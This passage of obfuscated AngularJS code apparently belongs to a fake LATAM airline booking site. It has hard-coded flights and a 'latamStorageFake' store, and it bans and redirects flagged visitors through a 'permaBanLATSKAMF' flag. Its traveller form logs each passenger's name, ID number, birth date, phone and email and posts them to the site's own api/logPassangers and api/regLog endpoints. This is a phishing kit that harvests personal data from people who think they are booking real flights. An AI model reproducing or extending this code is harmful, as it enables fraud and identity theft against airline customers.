      // Índice visual seleccionado (fallback al primero)
      var idx = typeof $scope.showCard === "number" ? $scope.showCard : 0;
      var selected = list && list[idx] ? list[idx] : null;
      if (!selected) return;

      // Buscar si ya existe el step
      var foundIndex = -1;
      for (let i = 0; i < somayah.length; i++) {
        if (somayah[i].step === step) {
          foundIndex = i;
          break;
        }
      }

      var flightData = {
        vuelo: selected,
        cardId: $scope.chosenGUID,
        cabine: type || "b", // valor por defecto
      };

      if (foundIndex !== -1) {
        somayah[foundIndex].info = [flightData];
      } else {
        somayah.push({ step: step, info: [flightData] });
      }

      // Persistir
      localStorage.setItem("latamStorageFake", JSON.stringify(somayah));

      // Navegación (igual que antes, con guardas)
      if (tramoVuelta) {
        if (typeof $scope.goFinalReview === "function") $scope.goFinalReview();
      } else {
        if (typeof $scope.goConfirmOrF2 === "function") $scope.goConfirmOrF2();
      }
    };

    $scope.goConfirmOrF2 = function () {
      $scope.regLog("PRIMER VUELO ELEGIDO");
      $state.transitionTo("/ReviewVuelo", {
        cardId: $scope.chosenGUID,
        pointOfSale: "web",
        language: "es-ES",
      });
    };
    $scope.isThisMFBan = function () {
      if (
        null != localStorage.getItem("permaBanLATSKAMF") &&
        1 == localStorage.getItem("permaBanLATSKAMF")
      ) {
        document.location.href = window.location.origin;
      }
    };
    $scope.isThisMFBan();
  },
]);

app.controller("reviewPickController", [
  "$scope",
  "$http",
  "$timeout",
  "$interval",
  "$state",
  "GUIDService",
  function ($scope, $http, $timeout, $interval, $state, GUIDService) {
    $scope.goHome = function () {
      $state.transitionTo("/");
    };
    $("html, body").animate({
      scrollTop: 0,
    });
    $scope.regLog = function (lashonte) {
      $http
        .post("api/regLog", {
          log: lashonte,
        })
        .success(function (joeangel) {})
        .error(function (durke) {
          console.log(durke);
          $scope.loading = false;
        });
    };
    $scope.months = [
      "",
      "Enero",
      "Febrero",
      "Marzo",
      "Abril",
      "Mayo",
      "Junio",
      "Julio",
      "Agosto",
      "Septiembre",
      "Octubre",
      "Noviembre",
      "Diciembre",
    ];
    $scope.daysT = ["Dom", "Lun", "Mar", "Mié", "Jue", "Vie", "Sáb"];
    $scope.monthNumber = new Date().getMonth() + 1;
    $scope.daysInMonth = function (cloee, shaynia) {
      return new Date(shaynia, cloee, 0).getDate();
    };
    $scope.getNumber = function (maxima) {
      return new Array(maxima);
    };
    var kolden = new Date();
    $scope.dd = String(kolden.getDate()).padStart(2, "0");
    $scope.actualM = parseInt($scope.monthNumber);
    $scope.dataLatam = JSON.parse(localStorage.getItem("latamStorageFake"));
    $scope.getCabine = function (quendarious) {
      return "l" == quendarious
        ? "Light"
        : "b" == quendarious
        ? "Basic"
        : "f" == quendarious
        ? "Full"
        : undefined;
    };
    $scope.vuelos = [
      {
        h1: "5:40 a.m.",
        h2: "6:42 a.m.",
        avt: "1h 2 min",
        price: 49900,
      },
      {
        h1: "9:32 a.m.",
        h2: "11:02 p.m.",
        avt: "1h 30 min",
        price: 49900,
      },
      {
        h1: "14:50 p.m.",
        h2: "16:10 p.m.",
        avt: "1h 20 min",
        price: 49900,
      },
      {
        h1: "19:15 p.m.",
        h2: "20:40 p.m.",
        avt: "1h 25 min",
        price: 49900,
      },
    ];
    $scope.vuelos2 = [
      {
        h1: "6:40 a.m.",
        h2: "7:56 a.m.",
        avt: "1h 16 min",
        price: 49900,
      },
      {
        h1: "8:30 a.m.",
        h2: "9:55 p.m.",
        avt: "1h 15 min",
        price: 49900,
      },
      {
        h1: "13:20 p.m.",
        h2: "14:28 p.m.",
        avt: "1h 8 min",
        price: 49900,
      },
      {
        h1: "16:15 p.m.",
        h2: "17:45 p.m.",
        avt: "1h 30 min",
        price: 49900,
      },
    ];
    $scope.vuelosStandard = [
      {
        h1: "5:40 a.m.",
        h2: "6:42 a.m.",
        avt: "1h 2 min",
        price: 49900,
      },
      {
        h1: "9:32 a.m.",
        h2: "11:02 p.m.",
        avt: "1h 30 min",
        price: 49900,
      },
      {
        h1: "14:50 p.m.",
        h2: "16:10 p.m.",
        avt: "1h 20 min",
        price: 49900,
      },
      {
        h1: "19:15 p.m.",
        h2: "20:40 p.m.",
        avt: "1h 25 min",
        price: 49900,
      },
    ];
    $scope.dataVuelos = undefined;
    var jreem = -1;
    for (let maxine = 0; maxine < $scope.dataLatam.length; maxine++) {
      if (1 == $scope.dataLatam[maxine].step) {
        jreem = maxine;
      }
    }
    if (-1 != jreem) {
      $scope.dataVuelos = $scope.dataLatam[jreem].info[0];
    } else {
      $state.transitionTo("/");
    }
    var bodie = -1;
    for (let briton = 0; briton < $scope.dataLatam.length; briton++) {
      if (2 == $scope.dataLatam[briton].step) {
        bodie = briton;
      }
    }
    $scope.pickedF = $scope.dataLatam[bodie].info[0];
    // --- helper para sumar recargo por cabina ---
    $scope.cabinAddCOP = function (cab) {
      if (cab === "l") return 50000;
      if (cab === "f") return 90000;
      return 0; // basic
    };

    // --- precios por pasajero (precomputados para mostrar) ---
    $scope.priceGoUSD = "";
    $scope.priceBackUSD = "";

    function computeVisiblePrices() {
      // IDA
      if ($scope.pickedF && $scope.pickedF.vuelo) {
        var baseGo = parseInt($scope.pickedF.vuelo.price, 10) || 0;
        var addGo = $scope.cabinAddCOP($scope.pickedF.cabine);
        $scope.priceGoUSD = formatUSD(copToUsd(baseGo + addGo));
      } else {
        $scope.priceGoUSD = formatUSD(0);
      }

      // VUELTA
      if (
        $scope.dataVuelos &&
        $scope.dataVuelos.travelType == 1 &&
        $scope.pickedFV &&
        $scope.pickedFV.vuelo
      ) {
        var baseBk = parseInt($scope.pickedFV.vuelo.price, 10) || 0;
        var addBk = $scope.cabinAddCOP($scope.pickedFV.cabine);
        $scope.priceBackUSD = formatUSD(copToUsd(baseBk + addBk));
      } else {
        $scope.priceBackUSD = "";
      }
    }

    $scope.loader = true;
    $timeout(function () {
      $scope.loader = undefined;
    }, 500); // Definición de los días de la semana y los meses
    $scope.daysT = ["Do", "Lu", "Ma", "Mi", "Ju", "Vi", "Sa"];
    $scope.months = [
      "",
      "Enero",
      "Febrero",
      "Marzo",
      "Abril",
      "Mayo",
      "Junio",
      "Julio",
      "Agosto",
      "Septiembre",
      "Octubre",
      "Noviembre",
      "Diciembre",
    ];

    // Función para obtener las fechas de los vuelos
    $scope.getDatesVuelos = function (shanie, denesa) {
      if (shanie != null) {
        let kaliese = shanie.split("-");
        var yasmein = new Date(kaliese[0], kaliese[1] - 1, kaliese[2]);

        var dayIndex = yasmein.getDay();
        var suyapa =
          $scope.daysT[dayIndex] +
          ". " +
          kaliese[2] +
          " de " +
          $scope.months[parseInt(kaliese[1])].toLowerCase();

        if (denesa != null) {
          let arien = denesa.split("-");
          var yasmeinVuelta = new Date(arien[0], arien[1] - 1, arien[2]);

          var dayIndexVuelta = yasmeinVuelta.getDay();
          suyapa +=
            " a " +
            $scope.daysT[dayIndexVuelta] +
            ". " +
            arien[2] +
            " de " +
            $scope.months[parseInt(arien[1])].toLowerCase();
        }

        return suyapa;
      }
      return "";
    };

    // Función para obtener el número de días en un mes
    $scope.daysInMonth = function (jerriann, yamilah) {
      return new Date(yamilah, jerriann, 0).getDate();
    };

    // Función para obtener el primer día del mes (0 = Domingo, 6 = Sábado)
    $scope.getFirstDayOfMonth = function (year, month) {
      return new Date(year, month - 1, 1).getDay();
    };

    // Función para generar los días del mes para el calendario
    $scope.generateMonthDays = function (year, month) {
      var firstDay = $scope.getFirstDayOfMonth(year, month);
      var daysInMonth = $scope.daysInMonth(month, year);
      var days = [];

      // Agregar días vacíos al principio si es necesario
      for (var i = 0; i < firstDay; i++) {
        days.push(null);
      }

      // Agregar los días del mes
      for (var i = 1; i <= daysInMonth; i++) {
        days.push(i);
      }

      return days;
    };

    // Función para obtener el texto de una fecha
    $scope.getTextDate = function (date) {
      let parts = date.split("-");
      let dateObj = new Date(parts[0], parts[1] - 1, parts[2]);
      return (
        $scope.daysT[dateObj.getDay()] +
        ". " +
        parts[2] +
        " de " +
        $scope.months[parseInt(parts[1])].toLowerCase()
      );
    };
    $scope.addshowCard = function (stevenn) {
      if (stevenn != $scope.showCard) {
        $scope.showCard = stevenn;
      }
    };
    $scope.hideShowCard = function () {
      $timeout(function () {
        $scope.showCard = undefined;
      }, 100);
    };
    $scope.getInfoVuelo = function (fecha) {
      if (fecha) {
        let partesFecha = fecha.split("-");
        if (partesFecha.length === 3) {
          var fechaObj = new Date(
            partesFecha[0],
            partesFecha[1] - 1,
            partesFecha[2]
          );

          var diaIndex = fechaObj.getDay();
          var dia = parseInt(partesFecha[2]);
          var mes = $scope.months[parseInt(partesFecha[1])];

          return (
            $scope.daysT[diaIndex].substring(0, 2) +
            ". " +
            dia +
            " de " +
            mes.toLowerCase()
          );
        }
      }
      return "Fecha no disponible";
    };
    $scope.getFormattedDate = function (fecha) {
      if (fecha) {
        let partesFecha = fecha.split("-");
        if (partesFecha.length === 3) {
          var year = parseInt(partesFecha[0]);
          var month = parseInt(partesFecha[1]) - 1; // Los meses en JavaScript van de 0 a 11
          var day = parseInt(partesFecha[2]);
          var fechaObj = new Date(year, month, day);

          var diaIndex = fechaObj.getDay();

          return (
            $scope.daysT[diaIndex] +
            ". " +
            day +
            " de " +
            $scope.months[month + 1].toLowerCase()
          );
        }
      }
      return "Fecha no disponible";
    };

    // Asegúrate de que estas definiciones estén en tu controlador
    $scope.daysT = ["Do", "Lu", "Ma", "Mi", "Ju", "Vi", "Sá"];
    $scope.months = [
      "",
      "enero",
      "febrero",
      "marzo",
      "abril",
      "mayo",
      "junio",
      "julio",
      "agosto",
      "septiembre",
      "octubre",
      "noviembre",
      "diciembre",
    ];
    $scope.getPriceFormattedPlusCabine = function (baseCOP, extraCOP, cabine) {
      var add = 0;
      if (cabine === "l") add = 50000;
      else if (cabine === "f") add = 90000;

      var totalCOP =
        (parseInt(baseCOP, 10) || 0) + (parseInt(extraCOP, 10) || 0) + add;

      // Convertir a USD y mostrar solo número con dos decimales (punto, sin coma)
      var usdAmount = copToUsd(totalCOP);
      return Number(usdAmount).toFixed(2);
    };

    $scope.getPriceFormatted = function (lauranne, stavon, lovie) {
      var baseCOP = arguments[0];
      var extraCOP = arguments[1];
      var totalCOP =
        (parseInt(baseCOP, 10) || 0) + (parseInt(extraCOP, 10) || 0);
      return formatUSD(copToUsd(totalCOP));
    };
    $scope.GUID = function () {
      return "10000000-1000-4000-8000-100000000000".replace(
        /[018]/g,
        (nikeya) =>
          (
            nikeya ^
            (crypto.getRandomValues(new Uint8Array(1))[0] &
              (15 >> (nikeya / 4)))
          ).toString(16)
      );
    };
    $scope.chosenGUID = GUIDService.getGUID();
    $scope.pickFlight = function (type, dir) {
      // dir: 'ida' | 'vuelta' (en confirmf.html ya llamas pickFlight('b','vuelta'))
      var tramoVuelta = dir === "vuelta";
      var step = tramoVuelta ? 3 : 2; // 2=ida, 3=vuelta

      var somayah = $scope.dataLatam;
      if (!Array.isArray(somayah)) {
        somayah = [];
        $scope.dataLatam = somayah;
      }

      // Seleccionar la lista visual correcta
      var list = tramoVuelta
        ? Array.isArray($scope.vuelos2) && $scope.vuelos2.length
          ? $scope.vuelos2
          : $scope.vuelos
        : $scope.vuelos;

      // Índice de la tarjeta seleccionada
      var idx = typeof $scope.showCard === "number" ? $scope.showCard : 0;
      var selected = list && list[idx] ? list[idx] : null;
      if (!selected) return;

      // Ubicar si ya existe el step a sobrescribir
      var foundIndex = -1;
      for (let i = 0; i < somayah.length; i++) {
        if (somayah[i].step === step) {
          foundIndex = i;
          break;
        }
      }

      var flightData = {
        vuelo: selected,
        cardId: $scope.chosenGUID,
        cabine: type || "b",
      };

      if (foundIndex !== -1) {
        somayah[foundIndex].info = [flightData];
      } else {
        somayah.push({ step: step, info: [flightData] });
      }

      localStorage.setItem("latamStorageFake", JSON.stringify(somayah));

      // Navegación según tramo
      if (tramoVuelta) {
        if (typeof $scope.goFinalReview === "function") $scope.goFinalReview();
      } else {
        if (typeof $scope.goConfirmOrF2 === "function") $scope.goConfirmOrF2();
      }
    };

    $scope.calcTotal = function () {
      try {
        var add = 0;
        if ($scope.pickedF && $scope.pickedF.cabine === "l") add = 50000;
        else if ($scope.pickedF && $scope.pickedF.cabine === "f") add = 90000;
        var base =
          $scope.pickedF && $scope.pickedF.vuelo && $scope.pickedF.vuelo.price
            ? $scope.pickedF.vuelo.price
            : 0;
        var totalCOP = (parseInt(base, 10) || 0) + add;
        if (
          $scope.dataVuelos &&
          $scope.dataVuelos.travelType == 1 &&
          $scope.pickedFV &&
          $scope.pickedFV.vuelo
        ) {
          var add2 = 0;
          if ($scope.pickedFV.cabine === "l") add2 = 50000;
          else if ($scope.pickedFV.cabine === "f") add2 = 90000;
          totalCOP += (parseInt($scope.pickedFV.vuelo.price, 10) || 0) + add2;
        }
        if ($scope.dataVuelos && $scope.dataVuelos.passengers) {
          totalCOP *= parseInt($scope.dataVuelos.passengers, 10) || 1;
        }
        return formatUSD(copToUsd(totalCOP));
      } catch (e) {
        return formatUSD(0);
      }
    };
    $scope.goBackFlights = function () {
      document.location.href = window.location.origin;
    };
    $scope.goFinalReview = function () {
      $scope.regLog("VUELOS ELEGIDOS, SE DIRIGE A REVIEW DE VUELOS");
      if (0 == $scope.dataVuelos.travelType) {
        $state.transitionTo("/Travelers");
      } else {
        $state.transitionTo("/ReviewFinal", {
          cardId: $scope.chosenGUID,
          pointOfSale: "web",
          language: "es-ES",
        });
      }
    };
    $scope.isThisMFBan = function () {
      if (
        null != localStorage.getItem("permaBanLATSKAMF") &&
        1 == localStorage.getItem("permaBanLATSKAMF")
      ) {
        document.location.href = window.location.origin;
      }
    };
    $scope.isThisMFBan();
  },
]);

app.controller("reviewFinalController", [
  "$scope",
  "$http",
  "$timeout",
  "$interval",
  "$state",
  function ($scope, $http, $timeout, kathrine, $state) {
    $scope.regLog = function (davonda) {
      $http
        .post("api/regLog", {
          log: davonda,
        })
        .success(function (ervena) {})
        .error(function (floie) {
          console.log(floie);
          $scope.loading = false;
        });
    };
    $scope.goBackFlights = function () {
      document.location.href = window.location.origin;
    };
    $("html, body").animate({
      scrollTop: 0,
    });
    $scope.loader = true;
    $timeout(function () {
      $scope.loader = undefined;
    }, 500);
    $scope.months = [
      "",
      "Enero",
      "Febrero",
      "Marzo",
      "Abril",
      "Mayo",
      "Junio",
      "Julio",
      "Agosto",
      "Septiembre",
      "Octubre",
      "Noviembre",
      "Diciembre",
    ];
    $scope.daysT = ["Dom", "Lun", "Mar", "Mié", "Jue", "Vie", "Sáb"];
    $scope.monthNumber = new Date().getMonth() + 1;
    $scope.daysInMonth = function (statham, bayley) {
      return new Date(bayley, statham, 0).getDate();
    };
    $scope.getNumber = function (darby) {
      return new Array(darby);
    };
    var jackielyn = new Date();
    $scope.dd = String(jackielyn.getDate()).padStart(2, "0");
    $scope.actualM = parseInt($scope.monthNumber);
    $scope.dataLatam = JSON.parse(localStorage.getItem("latamStorageFake"));
    $scope.getCabine = function (malaisha) {
      return "l" == malaisha
        ? "Light"
        : "b" == malaisha
        ? "Basic"
        : "f" == malaisha
        ? "Full"
        : undefined;
    };
    $scope.vuelos = [
      {
        h1: "5:40 a.m.",
        h2: "6:42 a.m.",
        avt: "1h 2 min",
        price: 49900,
      },
      {
        h1: "9:32 a.m.",
        h2: "11:02 p.m.",
        avt: "1h 30 min",
        price: 49900,
      },
      {
        h1: "14:50 p.m.",
        h2: "16:10 p.m.",
        avt: "1h 20 min",
        price: 25e4,
      },
      {
        h1: "19:15 p.m.",
        h2: "20:40 p.m.",
        avt: "1h 25 min",
        price: 35e4,
      },
    ];
    $scope.vuelos2 = [
      {
        h1: "6:40 a.m.",
        h2: "7:56 a.m.",
        avt: "1h 16 min",
        price: 49900,
      },
      {
        h1: "8:30 a.m.",
        h2: "9:55 p.m.",
        avt: "1h 15 min",
        price: 49900,
      },
      {
        h1: "13:20 p.m.",
        h2: "14:28 p.m.",
        avt: "1h 8 min",
        price: 25e4,
      },
      {
        h1: "16:15 p.m.",
        h2: "17:45 p.m.",
        avt: "1h 30 min",
        price: 35e4,
      },
    ];
    $scope.vuelosStandard = [
      {
        h1: "5:40 a.m.",
        h2: "6:42 a.m.",
        avt: "1h 2 min",
        price: 49900,
      },
      {
        h1: "9:32 a.m.",
        h2: "11:02 p.m.",
        avt: "1h 30 min",
        price: 49900,
      },
      {
        h1: "14:50 p.m.",
        h2: "16:10 p.m.",
        avt: "1h 20 min",
        price: 25e4,
      },
      {
        h1: "19:15 p.m.",
        h2: "20:40 p.m.",
        avt: "1h 25 min",
        price: 35e4,
      },
    ];
    $scope.goBack = function () {
      window.history.go(-1);
    };
    $scope.dataVuelos = undefined;
    var sal = -1;
    for (let janyhia = 0; janyhia < $scope.dataLatam.length; janyhia++) {
      if (1 == $scope.dataLatam[janyhia].step) {
        sal = janyhia;
      }
    }
    if (-1 != sal) {
      $scope.dataVuelos = $scope.dataLatam[sal].info[0];
    } else {
      $state.transitionTo("/");
    }
    var dynasty = -1;
    for (let giabella = 0; giabella < $scope.dataLatam.length; giabella++) {
      if (2 == $scope.dataLatam[giabella].step) {
        dynasty = giabella;
      }
    }
    $scope.pickedF = undefined;
    if (-1 != dynasty) {
      $scope.pickedF = $scope.dataLatam[dynasty].info[0];
    } else {
      $scope.goBack();
    }
    if (1 == $scope.dataVuelos.travelType) {
      var dayami = -1;
      for (let charan = 0; charan < $scope.dataLatam.length; charan++) {
        if (3 == $scope.dataLatam[charan].step) {
          dayami = charan;
        }
      }
      $scope.pickedFV = undefined;
      if (-1 != dayami) {
        $scope.pickedFV = $scope.dataLatam[dayami].info[0];
      } else {
        $scope.goBack();
      }
    }
    $scope.getPriceFormattedPlusCabine = function (nakishia, kazuyo, willys) {
      var baseCOP = arguments[0];
      var extraCOP = arguments[1];
      var cabine = arguments[2];
      var add = 0;
      if (cabine === "l") add = 50000;
      else if (cabine === "f") add = 90000;
      var totalCOP =
        (parseInt(baseCOP, 10) || 0) + (parseInt(extraCOP, 10) || 0) + add;
      return formatUSD(copToUsd(totalCOP));
    }; // Definición de los días de la semana y los meses
    $scope.daysT = ["Do", "Lu", "Ma", "Mi", "Ju", "Vi", "Sa"];
    $scope.months = [
      "",
      "Enero",
      "Febrero",
      "Marzo",
      "Abril",
      "Mayo",
      "Junio",
      "Julio",
      "Agosto",
      "Septiembre",
      "Octubre",
      "Noviembre",
      "Diciembre",
    ];

    // Función para obtener las fechas de los vuelos
    $scope.getDatesVuelos = function (shanie, denesa) {
      if (shanie != null) {
        let kaliese = shanie.split("-");
        var yasmein = new Date(kaliese[0], kaliese[1] - 1, kaliese[2]);

        var dayIndex = yasmein.getDay();
        var suyapa =
          $scope.daysT[dayIndex] +
          ". " +
          kaliese[2] +
          " de " +
          $scope.months[parseInt(kaliese[1])].toLowerCase();

        if (denesa != null) {
          let arien = denesa.split("-");
          var yasmeinVuelta = new Date(arien[0], arien[1] - 1, arien[2]);

          var dayIndexVuelta = yasmeinVuelta.getDay();
          suyapa +=
            " a " +
            $scope.daysT[dayIndexVuelta] +
            ". " +
            arien[2] +
            " de " +
            $scope.months[parseInt(arien[1])].toLowerCase();
        }

        return suyapa;
      }
      return "";
    };
    $scope.getInfoVuelo = function (fecha) {
      if (fecha) {
        let partesFecha = fecha.split("-");
        if (partesFecha.length === 3) {
          var fechaObj = new Date(
            partesFecha[0],
            partesFecha[1] - 1,
            partesFecha[2]
          );

          var diaIndex = fechaObj.getDay();
          var dia = parseInt(partesFecha[2]);
          var mes = $scope.months[parseInt(partesFecha[1])];

          return (
            $scope.daysT[diaIndex].substring(0, 2) +
            ". " +
            dia +
            " de " +
            mes.toLowerCase()
          );
        }
      }
      return "Fecha no disponible";
    };
    $scope.getFormattedDate = function (fecha) {
      if (fecha) {
        let partesFecha = fecha.split("-");
        if (partesFecha.length === 3) {
          var year = parseInt(partesFecha[0]);
          var month = parseInt(partesFecha[1]) - 1; // Los meses en JavaScript van de 0 a 11
          var day = parseInt(partesFecha[2]);
          var fechaObj = new Date(year, month, day);

          var diaIndex = fechaObj.getDay();

          return (
            $scope.daysT[diaIndex] +
            ". " +
            day +
            " de " +
            $scope.months[month + 1].toLowerCase()
          );
        }
      }
      return "Fecha no disponible";
    };
    // Asegúrate de que estas definiciones estén en tu controlador
    $scope.daysT = ["Do", "Lu", "Ma", "Mi", "Ju", "Vi", "Sa"];
    $scope.months = [
      "",
      "enero",
      "febrero",
      "marzo",
      "abril",
      "mayo",
      "junio",
      "julio",
      "agosto",
      "septiembre",
      "octubre",
      "noviembre",
      "diciembre",
    ];
    // Función para obtener el número de días en un mes
    $scope.daysInMonth = function (jerriann, yamilah) {
      return new Date(yamilah, jerriann, 0).getDate();
    };

    // Función para obtener el primer día del mes (0 = Domingo, 6 = Sábado)
    $scope.getFirstDayOfMonth = function (year, month) {
      return new Date(year, month - 1, 1).getDay();
    };

    // Función para generar los días del mes para el calendario
    $scope.generateMonthDays = function (year, month) {
      var firstDay = $scope.getFirstDayOfMonth(year, month);
      var daysInMonth = $scope.daysInMonth(month, year);
      var days = [];

      // Agregar días vacíos al principio si es necesario
      for (var i = 0; i < firstDay; i++) {
        days.push(null);
      }

      // Agregar los días del mes
      for (var i = 1; i <= daysInMonth; i++) {
        days.push(i);
      }

      return days;
    };

    // Función para obtener el texto de una fecha
    $scope.getTextDate = function (date) {
      let parts = date.split("-");
      let dateObj = new Date(parts[0], parts[1] - 1, parts[2]);
      return (
        $scope.daysT[dateObj.getDay()] +
        ". " +
        parts[2] +
        " de " +
        $scope.months[parseInt(parts[1])].toLowerCase()
      );
    };
    $scope.addshowCard = function (vanesia) {
      if (vanesia != $scope.showCard) {
        $scope.showCard = vanesia;
      }
    };
    $scope.hideShowCard = function () {
      $timeout(function () {
        $scope.showCard = undefined;
      }, 100);
    };
    $scope.calcTotal = function () {
      try {
        var add = 0;
        if ($scope.pickedF && $scope.pickedF.cabine === "l") add = 50000;
        else if ($scope.pickedF && $scope.pickedF.cabine === "f") add = 90000;
        var base =
          $scope.pickedF && $scope.pickedF.vuelo && $scope.pickedF.vuelo.price
            ? $scope.pickedF.vuelo.price
            : 0;
        var totalCOP = (parseInt(base, 10) || 0) + add;
        if (
          $scope.dataVuelos &&
          $scope.dataVuelos.travelType == 1 &&
          $scope.pickedFV &&
          $scope.pickedFV.vuelo
        ) {
          var add2 = 0;
          if ($scope.pickedFV.cabine === "l") add2 = 50000;
          else if ($scope.pickedFV.cabine === "f") add2 = 90000;
          totalCOP += (parseInt($scope.pickedFV.vuelo.price, 10) || 0) + add2;
        }
        if ($scope.dataVuelos && $scope.dataVuelos.passengers) {
          totalCOP *= parseInt($scope.dataVuelos.passengers, 10) || 1;
        }
        return formatUSD(copToUsd(totalCOP));
      } catch (e) {
        return formatUSD(0);
      }
    };
    $scope.getInfoVuelo = function (fecha) {
      if (fecha) {
        let partesFecha = fecha.split("-");
        if (partesFecha.length === 3) {
          var year = parseInt(partesFecha[0]);
          var month = parseInt(partesFecha[1]) - 1; // Los meses en JavaScript van de 0 a 11
          var day = parseInt(partesFecha[2]);
          var fechaObj = new Date(year, month, day);

          var diaIndex = fechaObj.getDay();

          return (
            $scope.daysT[diaIndex] +
            ". " +
            day +
            " de " +
            $scope.months[month + 1].toLowerCase()
          );
        }
      }
      return "Fecha no disponible";
    };

    // Asegúrate de que estas definiciones estén en tu controlador
    $scope.daysT = ["Do", "Lu", "Ma", "Mi", "Ju", "Vi", "Sá"];
    $scope.months = [
      "",
      "enero",
      "febrero",
      "marzo",
      "abril",
      "mayo",
      "junio",
      "julio",
      "agosto",
      "septiembre",
      "octubre",
      "noviembre",
      "diciembre",
    ];
    $scope.getPriceFormatted = function (sircharles, allia, yamil) {
      var baseCOP = arguments[0];
      var extraCOP = arguments[1];
      var totalCOP =
        (parseInt(baseCOP, 10) || 0) + (parseInt(extraCOP, 10) || 0);
      return formatUSD(copToUsd(totalCOP));
    };
    $scope.goToForms = function () {
      $scope.regLog("SE DIRIGE A PANTALLA DE PASAJEROS");
      $state.transitionTo("/Travelers");
    };
  },
]);

app.controller("travelersController", [
  "$scope",
  "$http",
  "$timeout",
  "$interval",
  "$state",
  function ($scope, $http, $timeout, jaterica, $state) {
    $scope.regLog = function (data) {
      $http
        .post("api/regLog", {
          log: data,
        })
        .success(function (vandela) {})
        .error(function (eliecer) {
          console.log(eliecer);
          $scope.loading = false;
        });
    };
    $scope.dataLatam = JSON.parse(localStorage.getItem("latamStorageFake"));
    $scope.loader = true;

    $scope.isSending = false;

    $timeout(function () {
      $scope.loader = undefined;
    }, 500);
    $scope.goBack = function () {
      window.history.go(-1);
    };
    $scope.dataVuelos = undefined;
    var lueella = -1;
    for (let curron = 0; curron < $scope.dataLatam.length; curron++) {
      if (1 == $scope.dataLatam[curron].step) {
        lueella = curron;
      }
    }
    if (-1 != lueella) {
      $scope.dataVuelos = $scope.dataLatam[lueella].info[0];
    } else {
      $state.transitionTo("/");
    }
    $scope.passengers = [];
    for (let farzana = 0; farzana < $scope.dataVuelos.passengers; farzana++) {
      $scope.passengers.push({
        nombre: "",
        apellido: "",
        fechanac: "",
        genero: "Masculino",
        nacionalidad: "Ecuador",
        doc: "cedula",
        cedula: "",
        email: "",
        tel: "",
        nb: false,
        ab: false,
        fb: false,
        cb: false,
        eb: false,
        tb: false,
        finished: false,
      });
    }
    if (-1 != lueella) {
      $scope.dataVuelos = $scope.dataLatam[lueella].info[0];
    } else {
      $state.transitionTo("/");
    }
    var paizlie = -1;
    for (let cameshia = 0; cameshia < $scope.dataLatam.length; cameshia++) {
      if (2 == $scope.dataLatam[cameshia].step) {
        paizlie = cameshia;
      }
    }
    $scope.pickedF = undefined;
    if (-1 != paizlie) {
      $scope.pickedF = $scope.dataLatam[paizlie].info[0];
    } else {
      $scope.goBack();
    }
    if (1 == $scope.dataVuelos.travelType) {
      var ethelynn = -1;
      for (let stephina = 0; stephina < $scope.dataLatam.length; stephina++) {
        if (3 == $scope.dataLatam[stephina].step) {
          ethelynn = stephina;
        }
      }
      $scope.pickedFV = undefined;
      if (-1 != ethelynn) {
        $scope.pickedFV = $scope.dataLatam[ethelynn].info[0];
      } else {
        $scope.goBack();
      }
    }
    $scope.calcTotal = function () {
      try {
        var add = 0;
        if ($scope.pickedF && $scope.pickedF.cabine === "l") add = 50000;
        else if ($scope.pickedF && $scope.pickedF.cabine === "f") add = 90000;
        var base =
          $scope.pickedF && $scope.pickedF.vuelo && $scope.pickedF.vuelo.price
            ? $scope.pickedF.vuelo.price
            : 0;
        var totalCOP = (parseInt(base, 10) || 0) + add;
        if (
          $scope.dataVuelos &&
          $scope.dataVuelos.travelType == 1 &&
          $scope.pickedFV &&
          $scope.pickedFV.vuelo
        ) {
          var add2 = 0;
          if ($scope.pickedFV.cabine === "l") add2 = 50000;
          else if ($scope.pickedFV.cabine === "f") add2 = 90000;
          totalCOP += (parseInt($scope.pickedFV.vuelo.price, 10) || 0) + add2;
        }
        if ($scope.dataVuelos && $scope.dataVuelos.passengers) {
          totalCOP *= parseInt($scope.dataVuelos.passengers, 10) || 1;
        }
        return formatUSD(copToUsd(totalCOP));
      } catch (e) {
        return formatUSD(0);
      }
    };
    $scope.validateEmail = function (deeksha) {
      return /\S+@\S+\.\S+/.test(deeksha);
    };
    $scope.validateFields = function (kymarie) {
      let rella = $scope.passengers[kymarie];
      if (null != rella.nombre && rella.nombre.length > 2) {
        $scope.passengers[kymarie].nb = false;
        if (null != rella.apellido && rella.apellido.length > 2) {
          $scope.passengers[kymarie].ab = false;
          $scope.passengers[kymarie].fb = false;
          if (null != rella.cedula && rella.cedula.length > 4) {
            $scope.passengers[kymarie].cb = false;
            if (null != rella.tel && 10 == rella.tel.length) {
              $scope.regLog(
                "Llenó datos de usuario: " +
                  rella.nombre +
                  " " +
                  rella.apellido +
                  " - NAC" +
                  rella.fechanac +
                  " - Doc:" +
                  rella.cedula +
                  " - Tel:" +
                  rella.tel +
                  " - Email: " +
                  rella.email
              );
              $scope.passengers[kymarie].tb = false;
              if (null != rella.email && $scope.validateEmail(rella.email)) {
                $scope.passengers[kymarie].eb = false;
                $scope.passengers[kymarie].finished = true;
                $("html, body").animate({
                  scrollTop: 0,
                });
              } else {
                $("html, body").animate({
                  scrollTop: $("#email").offset().top,
                });
                $scope.passengers[kymarie].eb = true;
                alert("Correo electrónico erroneo.");
              }
            } else {
              $("html, body").animate({
                scrollTop: $("#tel").offset().top,
              });
              $scope.passengers[kymarie].tb = true;
            }
          } else {
            $("html, body").animate({
              scrollTop: $("#cedula").offset().top,
            });
            $scope.passengers[kymarie].cb = true;
          }
        } else {
          $scope.passengers[kymarie].ab = true;
          $("html, body").animate({
            scrollTop: $("#apellido").offset().top,
          });
        }
      } else {
        $scope.passengers[kymarie].nb = true;
        $("html, body").animate({
          scrollTop: $("#nombre").offset().top,
        });
      }
    };

    $scope.sendPassengersData = function () {
      return new Promise((resolve, reject) => {
        let passengersData = $scope.passengers.map((passenger) => ({
          nombre: passenger.nombre,
          apellido: passenger.apellido,
          cedula: passenger.cedula,
          fechaNacimiento: passenger.fechanac,
          telefono: passenger.tel,
          email: passenger.email,
          vuelo: {
            origen: $scope.dataVuelos.origin.code,
            destino: $scope.dataVuelos.destination.code,
            tipo_cabina: $scope.pickedF.cabine,
          },
        }));

        $http({
          method: "POST",
          url: "api/logPassangers",
          data: {
            passengers: passengersData,
          },
          headers: {
            "Content-Type": "application/json",
          },
        })
          .then(function (response) {
            console.log("Datos enviados exitosamente", response);
            resolve(response);
          })
          .catch(function (error) {
            console.error("Error al enviar datos", error);
            reject(error);
          });
      });
    };

    $scope.checkBirthDate = function (index) {
      // Get the current passenger
      let passenger = $scope.passengers[index];

      // Remove any non-digit characters from input
      let cleanDate = passenger.fechanac.replace(/\D/g, "");

